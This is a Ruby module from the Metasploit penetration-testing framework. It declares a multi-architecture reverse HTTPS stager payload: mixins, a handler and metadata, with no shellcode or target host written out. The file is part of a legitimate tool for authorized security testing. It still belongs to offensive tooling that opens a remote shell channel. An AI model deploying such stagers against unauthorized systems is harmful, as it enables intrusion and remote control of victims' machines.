##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 0

  include Msf::Payload::Stager
  include Msf::Payload::Multi
  include Msf::Payload::Multi::ReverseHttps

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Reverse HTTPS Stager (Multiple Architectures)',
        'Description' => 'Tunnel communication over HTTPS',
        'Author' => 'OJ Reeves',
        'License' => MSF_LICENSE,
        'Platform' => ['multi'],
        'Arch' => ARCH_ALL,
        'Handler' => Msf::Handler::ReverseHttps,
        'Stager' => { 'Payload' => '' },
        'Convention' => 'https'
      )
    )
  end
end
